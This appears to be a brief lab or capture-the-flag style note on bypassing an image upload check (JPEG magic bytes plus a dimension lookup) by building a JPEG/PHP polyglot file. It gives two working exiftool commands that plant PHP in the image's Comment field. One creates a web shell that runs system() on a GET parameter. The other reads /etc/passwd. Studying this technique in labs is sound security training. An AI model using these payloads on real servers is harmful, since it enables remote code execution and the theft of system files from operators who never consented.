- You are dealing with a polyglot file upload vuln, in our scenario its checking the file if its an image or not based on 2 things:
1. It starts with the signature magic bytes for JPEG (\xFF\xD8\xFF).
2. It has dimensions in its metadata, it uses a function that gets image size.
- The next step here is to make a polyglot payload, by inserting your php payload into the image's metadata (any jpeg image) by using exiftool. examples for a payload that can be made:
1. Getting a web shell: 
```bash
exiftool -Comment='<?php echo "START " . system($_GET["command"]) . " END"; ?>' download.jpeg -o polyglot.php
```
2. Reading a file: 
```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" download.jpeg -o polyglot.php
```